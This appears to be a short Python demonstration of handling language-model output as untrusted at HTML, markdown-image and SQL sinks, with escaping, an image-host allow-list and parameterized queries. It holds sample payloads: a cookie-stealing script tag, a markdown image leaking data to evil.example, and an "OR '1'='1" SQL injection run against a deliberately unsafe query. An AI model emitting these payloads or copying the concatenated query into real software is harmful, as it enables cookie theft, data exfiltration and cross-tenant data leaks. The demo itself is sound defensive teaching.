import html
import re
import sqlite3
from urllib.parse import urlparse

model_text = 'Order AT1001 ships today. <script>steal(document.cookie)</script> ![x](https://evil.example/p.png?d=0901234567)'

print("1. HTML sink")
print("   raw   :", model_text[:60])
print("   safe  :", html.escape(model_text)[:70])

ALLOWED_IMAGE_HOSTS = {"cdn.anhti.example"}


def strip_foreign_images(text):
    def repl(m):
        host = urlparse(m.group(2)).hostname
        return m.group(0) if host in ALLOWED_IMAGE_HOSTS else "[image removed]"
    return re.sub(r"!\[([^\]]*)\]\(([^)\s]+)\)", repl, text)


print("2. Markdown image sink")
print("   before:", re.findall(r"!\[[^\]]*\]\([^)]+\)", model_text))
print("   after :", strip_foreign_images(model_text).split("</script> ")[1])

db = sqlite3.connect(":memory:")
db.executescript("create table orders(code text, tenant text); insert into orders values('AT1001','br-cau-go'),('AT2002','br-ben-song');")
model_sql_arg = "AT1001' OR '1'='1"

print("3. SQL sink: model output used as a filter value")
unsafe = db.execute(f"select code from orders where code = '{model_sql_arg}'").fetchall()
safe = db.execute("select code from orders where code = ?", (model_sql_arg,)).fetchall()
print("   string concat rows:", len(unsafe), unsafe)
print("   parameterized rows:", len(safe))
